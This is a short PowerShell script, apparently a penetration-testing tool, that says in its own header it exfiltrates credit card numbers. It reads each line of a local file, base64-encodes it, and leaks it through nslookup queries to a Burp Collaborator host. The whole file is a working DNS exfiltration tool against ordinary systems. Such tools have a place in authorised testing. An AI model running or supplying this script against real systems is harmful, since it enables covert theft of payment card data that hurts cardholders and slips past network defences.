# ExfilCards.ps1 by @xer0dayz - https://xerosecurity.com
#
# This script will exfil credit card numbers via base64 encoded strings to a custom DNS server.
#

$lines = Get-Content .\exfil.txt
foreach ($line in $lines.Split('\r\n')){
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($line)
    $EncodedText =[Convert]::ToBase64String($Bytes)
    nslookup "$EncodedText.yourburphost.burpcollaborator.net"
}